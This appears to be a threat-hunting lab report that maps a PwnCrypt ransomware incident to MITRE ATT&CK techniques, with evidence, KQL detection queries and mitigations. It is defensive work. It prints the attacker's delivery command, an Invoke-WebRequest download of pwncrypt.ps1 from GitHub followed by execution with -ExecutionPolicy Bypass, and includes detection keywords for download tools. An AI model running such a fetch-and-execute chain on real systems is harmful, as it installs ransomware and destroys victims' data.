#  MITRE ATT&CK Framework Mapping

> **Hunt:** Zero-Day Ransomware — PwnCrypt Outbreak Investigation  
> **Date:** March 28, 2026  
> **Reference:** [MITRE ATT&CK v14](https://attack.mitre.org/)

---

## Overview

This hunt confirmed the most extensive MITRE ATT&CK coverage of any exercise in this series — **7 TTPs** spanning **Initial Access**, **Execution**, **Defense Evasion**, **Command & Control**, **Persistence**, and **Impact**. The PwnCrypt attack chain represents a complete, real-world ransomware playbook executed using entirely legitimate Windows tooling.

---

## ATT&CK Navigator Summary

```
INITIAL ACCESS        EXECUTION                    DEFENSE EVASION
┌───────────────┐    ┌────────────────────────┐   ┌────────────────────┐
│  T1566        │    │  T1059.001             │   │  T1218.011         │
│  Phishing     │    │  PowerShell            │   │  Signed Binary     │
│  (Potential)  │    │  -ExecutionPolicy      │   │  Proxy Execution   │
│               │    │  Bypass (Confirmed)    │   │  (PowerShell)      │
└───────────────┘    ├────────────────────────┤   │  (Confirmed)       │
                     │  T1059.003             │   └────────────────────┘
PERSISTENCE          │  Windows Command Shell │
┌───────────────┐    │  cmd.exe → PowerShell  │   COMMAND & CONTROL
│  T1547        │    │  (Confirmed)           │   ┌────────────────────┐
│  Boot/Logon   │    └────────────────────────┘   │  T1105             │
│  Autostart    │                                  │  Ingress Tool      │
│  (Potential)  │                                  │  Transfer          │
└───────────────┘    IMPACT                        │  (Confirmed)       │
                     ┌────────────────────────┐    └────────────────────┘
                     │  T1486                 │
                     │  Data Encrypted for    │
                     │  Impact (Ransomware)   │
                     │  AES-256 (Confirmed)   │
                     └────────────────────────┘
```

---

## Detailed TTP Analysis

### T1486 — Data Encrypted for Impact

| Field | Detail |
|---|---|
| **Tactic** | Impact |
| **ID** | [T1486](https://attack.mitre.org/techniques/T1486/) |
| **Status in Hunt** | ✅ Confirmed — Primary TTP |
| **Confidence** | High |

**Description:**
This is the core ransomware technique — adversaries encrypt data on target systems to interrupt availability and extort victims for decryption keys. PwnCrypt implements this via AES-256 encryption, appending `.pwncrypt` to filenames and delivering a ransom note (`decryption-instructions.txt`).

**Evidence:**
- Multiple `FileCreated` and `FileRenamed` events with `.pwncrypt` extension
- `9165_CompanyFinancials_pwncrypt.csv` — confirmed sensitive file encrypted
- Files staged in `C:\Windows\Temp`, moved to Desktop for victim visibility
- `decryption-instructions.txt` dropped to Desktop — ransom demand delivered
- `notepad.exe` confirmed opening ransom note — impact phase complete

**Why AES-256 matters:**
AES-256 is a military-grade encryption standard. Without the attacker's private key, encrypted files are mathematically unrecoverable. This is why backups are the only reliable recovery path — not decryption tools.

**Detection:**
```kql
DeviceFileEvents
| where FileName contains "pwncrypt"
| where ActionType in ("FileCreated", "FileRenamed")
```

**Mitigation:**
- Maintain regular, tested, offline backups
- Implement file system monitoring for mass rename events
- Restrict write access to sensitive directories

---

### T1059.001 — Command and Scripting Interpreter: PowerShell

| Field | Detail |
|---|---|
| **Tactic** | Execution |
| **ID** | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) |
| **Status in Hunt** | ✅ Confirmed |
| **Confidence** | High |

**Description:**
PowerShell was the primary execution engine for PwnCrypt. The ransomware payload (`pwncrypt.ps1`) was executed with `-ExecutionPolicy Bypass` — deliberately circumventing Windows script execution controls. PowerShell's deep OS integration makes it an ideal ransomware delivery vehicle: it can access the filesystem, encrypt files, and make network connections without triggering most AV tools.

**Evidence:**
- `powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\pwncrypt.ps1`
- Script stored in `C:\ProgramData\` — writable without elevation
- Execution confirmed via `DeviceProcessEvents` at `2026-03-28T07:14:47Z`

**Detection:**
```kql
DeviceProcessEvents
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has "-ExecutionPolicy Bypass"
| where ProcessCommandLine has "C:\\ProgramData\\"
```

**Mitigation:**
- Enable PowerShell Script Block Logging
- Deploy Constrained Language Mode for non-admin users
- Alert on `-ExecutionPolicy Bypass` in all production environments

---

### T1059.003 — Command and Scripting Interpreter: Windows Command Shell

| Field | Detail |
|---|---|
| **Tactic** | Execution |
| **ID** | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) |
| **Status in Hunt** | ✅ Confirmed |
| **Confidence** | High |

**Description:**
`cmd.exe` was used as a staging layer to launch PowerShell. This two-step execution pattern (`cmd.exe` → `powershell.exe`) is deliberate — it can obscure the origin of PowerShell execution in some logging configurations, and it allows attackers to chain commands in a single string.

**Evidence:**
- `cmd.exe` observed as `InitiatingProcessFileName` for the PowerShell launch
- Pattern: `cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\pwncrypt.ps1`

**Why this pattern is used:**
When PowerShell is launched directly, it may appear in process trees under the user's shell. Launching via `cmd.exe` can break expected parent-child process relationships and evade some detection rules that look specifically for `explorer.exe` → `powershell.exe` chains.

**Detection:**
```kql
DeviceProcessEvents
| where InitiatingProcessFileName =~ "cmd.exe"
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has "-ExecutionPolicy Bypass"
```

---

### T1218.011 — Signed Binary Proxy Execution: PowerShell

| Field | Detail |
|---|---|
| **Tactic** | Defense Evasion |
| **ID** | [T1218.011](https://attack.mitre.org/techniques/T1218/011/) |
| **Status in Hunt** | ✅ Confirmed |
| **Confidence** | High |

**Description:**
Attackers abuse signed, trusted Windows binaries to execute malicious code — because these binaries are trusted by the OS and most AV solutions. PowerShell is a signed Microsoft binary, making its use for malicious purposes a form of "living off the land" — the attacker uses the OS against itself.

**Evidence:**
- `powershell.exe` is a signed Microsoft binary used to execute `pwncrypt.ps1`
- No custom malware binary dropped — entire attack conducted via trusted OS tools

**Why this evades traditional AV:**
Traditional antivirus looks for known malicious binaries or signatures. When the attack uses `powershell.exe` (trusted) to run a `.ps1` script, many AV tools don't inspect the script contents — they see only a legitimate system binary executing.

**Mitigation:**
- AMSI (Antimalware Scan Interface) integration — allows AV to inspect PowerShell script content
- Application allowlisting — restrict which scripts PowerShell is permitted to run

---

### T1105 — Ingress Tool Transfer

| Field | Detail |
|---|---|
| **Tactic** | Command and Control |
| **ID** | [T1105](https://attack.mitre.org/techniques/T1105/) |
| **Status in Hunt** | ✅ Confirmed |
| **Confidence** | High |

**Description:**
The ransomware payload (`pwncrypt.ps1`) was transferred into the environment from an external source via `Invoke-WebRequest` — downloading the script from a public GitHub URL before execution.

**Delivery command observed:**
```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/[...]/pwncrypt.ps1' `
-OutFile 'C:\programdata\pwncrypt.ps1'; `
cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
```

**Evidence:**
- `pwncrypt.ps1` present at `C:\ProgramData\` on `saranpc2`
- Download + immediate execution pattern — single command chain
- `Invoke-WebRequest` used as the transfer mechanism

**Detection:**
```kql
DeviceProcessEvents
| where ProcessCommandLine has_any("Invoke-WebRequest", "iwr", "wget", "curl")
| where ProcessCommandLine has ".ps1"
```

**Mitigation:**
- Block outbound PowerShell web requests via egress filtering
- Monitor for `Invoke-WebRequest` in process command lines
- Restrict internet access from endpoints unless required

---

### T1566 — Phishing (Potential Initial Access)

| Field | Detail |
|---|---|
| **Tactic** | Initial Access |
| **ID** | [T1566](https://attack.mitre.org/techniques/T1566/) |
| **Status in Hunt** | ⚠️ Not directly observed — Inferred |
| **Confidence** | Medium |

**Description:**
While the initial delivery method for `pwncrypt.ps1` was not directly observed in MDE logs, phishing is the most likely real-world vector for this type of ransomware. The script could have been delivered via:
- A malicious email attachment
- A weaponised Office macro downloading the script
- A malicious link leading to an automatic download

**Why it's noted:**
Understanding the likely initial access vector is critical for prevention. Even if not confirmed in logs, mapping T1566 drives the recommendation for user awareness training.

**Investigation steps to confirm:**
- Review email gateway logs for messages received by the impacted user around the execution timestamp
- Check browser history/download history for the script source
- Review `DeviceFileEvents` for any Office document that spawned `powershell.exe`

**Mitigation:**
- User awareness training — phishing recognition
- Email gateway filtering with sandboxing
- Disable macro execution in Office for non-admin users

---

### T1547 — Boot or Logon Autostart Execution (Potential)

| Field | Detail |
|---|---|
| **Tactic** | Persistence |
| **ID** | [T1547](https://attack.mitre.org/techniques/T1547/) |
| **Status in Hunt** | ⚠️ Not directly observed — Investigate further |
| **Confidence** | Low-Medium |

**Description:**
The persistence of PowerShell executions involving `pwncrypt.ps1` raises the possibility of an autostart mechanism. If ransomware installs a persistence mechanism, it can survive reboots and re-encrypt files even after partial remediation.

**Investigation queries:**
```kql
// Check for registry persistence keys
DeviceRegistryEvents
| where DeviceName == "saranpc2"
| where RegistryKey has_any(
    "CurrentVersion\\Run",
    "CurrentVersion\\RunOnce",
    "Winlogon",
    "ScheduledTasks"
)
| where Timestamp > datetime(2026-03-28T07:00:00Z)
| order by Timestamp desc
```

```kql
// Check for scheduled task creation
DeviceProcessEvents
| where DeviceName == "saranpc2"
| where FileName =~ "schtasks.exe"
| where Timestamp > datetime(2026-03-28T07:00:00Z)
```

**Mitigation:**
- Review registry Run keys for unexpected entries before rebuilding
- Check scheduled tasks for persistence mechanisms
- Reimage if persistence cannot be definitively ruled out

---

## Complete Kill Chain Mapping

```
[T1566 — Phishing]          [T1105 — Ingress Tool Transfer]
User receives malicious   →  pwncrypt.ps1 downloaded to
link or attachment            C:\ProgramData\ via Invoke-WebRequest
        ↓
[T1059.003 — cmd.exe]       [T1218.011 — Signed Binary Proxy]
cmd.exe launches          →  powershell.exe (trusted MS binary)
PowerShell                    used to execute malicious script
        ↓
[T1059.001 — PowerShell]
powershell.exe -ExecutionPolicy Bypass
-File C:\ProgramData\pwncrypt.ps1
        ↓
[T1547 — Persistence?]      [T1486 — Data Encrypted for Impact]
Autostart mechanism       →  AES-256 encryption applied
potentially installed         .pwncrypt extension appended
                              decryption-instructions.txt dropped
        ↓
                    IMPACT COMPLETE
              User confronted with ransom demand
              notepad.exe opens ransom note
```

---

## Detection Coverage Assessment

| TTP | Detected During Hunt? | Automated Rule Recommended |
|---|---|---|
| T1486 — Data Encrypted for Impact | ✅ Yes — via `.pwncrypt` IoC in DeviceFileEvents | Known ransomware extension alert |
| T1059.001 — PowerShell | ✅ Yes — via DeviceProcessEvents CommandLine | ExecutionPolicy Bypass alert |
| T1059.003 — Windows Command Shell | ✅ Yes — cmd.exe as initiating process | cmd → powershell chain alert |
| T1218.011 — Signed Binary Proxy | ✅ Yes — PowerShell abuse confirmed | Covered by PowerShell logging |
| T1105 — Ingress Tool Transfer | ✅ Yes — Invoke-WebRequest in delivery | Web download + execute alert |
| T1566 — Phishing | ⚠️ Not confirmed — inferred | Email gateway alerting |
| T1547 — Persistence | ❌ Not investigated | Registry Run key monitoring |

---

## References

- [MITRE ATT&CK T1486](https://attack.mitre.org/techniques/T1486/)
- [MITRE ATT&CK T1059.001](https://attack.mitre.org/techniques/T1059/001/)
- [MITRE ATT&CK T1059.003](https://attack.mitre.org/techniques/T1059/003/)
- [MITRE ATT&CK T1218.011](https://attack.mitre.org/techniques/T1218/011/)
- [MITRE ATT&CK T1105](https://attack.mitre.org/techniques/T1105/)
- [MITRE ATT&CK T1566](https://attack.mitre.org/techniques/T1566/)
- [MITRE ATT&CK T1547](https://attack.mitre.org/techniques/T1547/)

---

*Mapping authored by: Saran | CyberRange Lab | March 28, 2026*
